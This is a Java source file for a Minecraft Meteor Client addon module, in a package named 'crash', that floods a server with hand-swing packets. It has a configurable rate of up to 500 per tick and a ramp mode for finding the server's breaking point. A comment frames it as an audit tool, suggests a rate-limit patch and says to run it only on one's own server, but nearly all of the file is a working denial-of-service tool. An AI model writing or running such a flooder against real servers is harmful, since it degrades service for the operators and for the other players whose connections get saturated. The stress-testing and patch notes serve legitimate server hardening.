package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;

/**
 * AUDIT: Arm-Animation Flood (O(viewers) broadcast saturation)
 *
 * Floods HandSwingC2SPacket at a configurable rate. The damaging property is
 * not the inbound parse cost but the rebroadcast: each accepted swing triggers
 * an entity-animation packet sent to EVERY player whose tracker includes you —
 * O(viewers) outbound packets per swing. At high rates this drives CPU on the
 * broadcast path and saturates other players' outbound queues.
 *
 * Pair with server-probe to watch out/s climb. Then use lag-profiler to find
 * the exact swing rate that drops TPS below your floor.
 *
 * Patch signal: rate-limit arm swings to at most one per tick per player;
 * debounce the animation broadcast so rapid consecutive swings from one
 * player produce at most one outbound packet per viewer per tick.
 *
 * Run against your OWN local server only.
 */
public class ArmAnimationFlood extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> swingsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("swings-per-tick").description("Arm swing packets to send each tick.")
        .defaultValue(50).range(1, 500).sliderRange(1, 200).build()
    );
    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
        .name("ramp-mode")
        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
        .defaultValue(false).build()
    );
    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
        .name("ramp-step").description("Rate increase per tick in ramp mode.")
        .defaultValue(10).range(1, 500).sliderRange(1, 100)
        .visible(rampMode::get).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int currentRate = 1;

    public ArmAnimationFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "arm-animation-flood",
            "Floods swing packets. Tests broadcast queue saturation.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; currentRate = 1; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        int rate = rampMode.get() ? currentRate : swingsPerTick.get();
        if (rampMode.get()) currentRate += rampStep.get();
        HandSwingC2SPacket packet = new HandSwingC2SPacket(Hand.MAIN_HAND);
        for (int i = 0; i < rate; i++) {
            mc.player.networkHandler.sendPacket(packet);
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
